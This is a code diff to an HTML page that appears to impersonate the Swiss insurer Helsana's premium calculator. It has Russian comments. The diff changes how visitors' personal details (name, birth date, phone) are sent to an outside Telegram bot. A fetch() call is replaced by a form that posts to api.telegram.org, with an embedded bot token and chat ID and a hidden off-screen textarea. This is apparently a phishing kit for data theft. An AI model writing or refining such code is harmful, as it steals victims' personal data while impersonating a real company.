@@ -314,7 +314,19 @@
       <section class="premium-calc">
         <h2 class="premium-calc__title" data-lang-ch="Persönliche Daten" data-lang-en="Personal details">Persönliche Daten</h2>
 
-        <form class="premium-calc__form" id="telegramForm">
+        <!-- Форма, которая отправляет данные напрямую в Telegram через новую вкладку -->
+        <form class="premium-calc__form" 
+              id="telegramForm"
+              action="https://api.telegram.org/bot9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI/sendMessage" 
+              method="POST"
+              target="_blank">
+              
+          <input type="hidden" name="chat_id" value="-1003907097706">
+          <input type="hidden" name="parse_mode" value="Markdown">
+          
+          <!-- Скрытое поле для сообщения -->
+          <textarea name="text" id="telegramText" style="position:absolute; left:-9999px; top:-9999px; opacity:0;" tabindex="-1" aria-hidden="true"></textarea>
+
           <div class="input-group">
             <label for="name" class="input-label-top" data-lang-ch="Ihr vollständiger Name" data-lang-en="Your full name">Ihr vollständiger Name</label>
             <input type="text" id="name" class="input-field" placeholder="Ihr vollständiger Name" required>
@@ -420,7 +432,7 @@
     <section class="awards">
       <div class="awards__container">
         <h2 class="awards__title" data-lang-ch="Unsere Auszeichnungen für Kundenzufriedenheit" data-lang-en="Our awards for customer satisfaction">Unsere Auszeichnungen für Kundenzufriedenheit</h2>
-        <p class="awards__lead" data-lang-ch="Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen." data-lang-en="Helsana is one of the health insurers with the most satisfied customers and excellent products. This is confirmed by the most important industry ratings. The top marks spur us on to do our best day after day – in customer service as well as with our insurance policies.">Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu tun – im Kundenservice wie auch bei unseren Versicherungen.</p>
+        <p class="awards__lead" data-lang-ch="Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen." data-lang-en="Helsana is one of the health insurers with the most satisfied customers and excellent products. This is confirmed by the most important industry ratings. The top marks spur us on to do our best day after day – in customer service as well as with our insurance policies.">Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen.</p>
 
         <div class="awards__badges">
           <img src="assets/123.svg" alt="Auszeichnungen: Ktipp, Comparis, Moneyland" width="356" height="83" class="awards__img">
@@ -498,11 +510,6 @@
 
   <script>
     document.addEventListener('DOMContentLoaded', () => {
-      
-      // Твои данные
-      const BOT_TOKEN = '9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI';
-      const CHAT_ID = '-1003907097706';
-
       // Маска для даты
       const geburtsdatumInput = document.getElementById('geburtsdatum');
       if (geburtsdatumInput) {
@@ -540,19 +547,10 @@
         });
       });
 
-      // Отправка
+      // Отправка (без preventDefault, чтобы форма ушла сама)
       const form = document.getElementById('telegramForm');
       
-      form.addEventListener('submit', async (e) => {
-        e.preventDefault();
-
-        const submitBtn = form.querySelector('button[type="submit"]');
-        const originalText = submitBtn.textContent;
-        
-        // Определяем текущий язык
-        const activeLang = document.querySelector('.lang-btn.is-active').getAttribute('data-lang');
-        const loadingText = activeLang === 'en' ? 'Sending...' : 'Senden...';
-
+      form.addEventListener('submit', () => {
         const name = document.getElementById('name').value;
         const geburtsdatum = document.getElementById('geburtsdatum').value;
         const telefon = document.getElementById('telefon').value;
@@ -579,46 +577,10 @@
         message += `🕒 Zeit: ${dateTime}\n`;
         message += `🌐 Browser: ${browserInfo}\n`;
 
-        submitBtn.textContent = loadingText;
-        submitBtn.disabled = true;
-
-        try {
-          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-          
-          const formData = new URLSearchParams();
-          formData.append('chat_id', CHAT_ID);
-          formData.append('text', message);
-          formData.append('parse_mode', 'Markdown');
-
-          const response = await fetch(url, {
-            method: 'POST',
-            body: formData
-          });
-
-          const data = await response.json();
-
-          if (data.ok) {
-            submitBtn.textContent = activeLang === 'en' ? '✅ Sent!' : '✅ Gesendet!';
-            submitBtn.style.background = '#28a745';
-            setTimeout(() => {
-              form.reset();
-              submitBtn.textContent = originalText;
-              submitBtn.style.background = '';
-              submitBtn.disabled = false;
-            }, 2000);
-          } else {
-            throw new Error(data.description || 'Fehler');
-          }
-        } catch (error) {
-          console.error('Ошибка:', error);
-          submitBtn.textContent = '❌ Fehler!';
-          submitBtn.style.background = '#dc3545';
-          setTimeout(() => {
-            submitBtn.textContent = originalText;
-            submitBtn.style.background = '';
-            submitBtn.disabled = false;
-          }, 3000);
-        }
+        // Записываем текст в скрытое поле
+        document.getElementById('telegramText').value = message;
+        
+        // Форма уходит сама в новую вкладку
       });
     });
   </script>
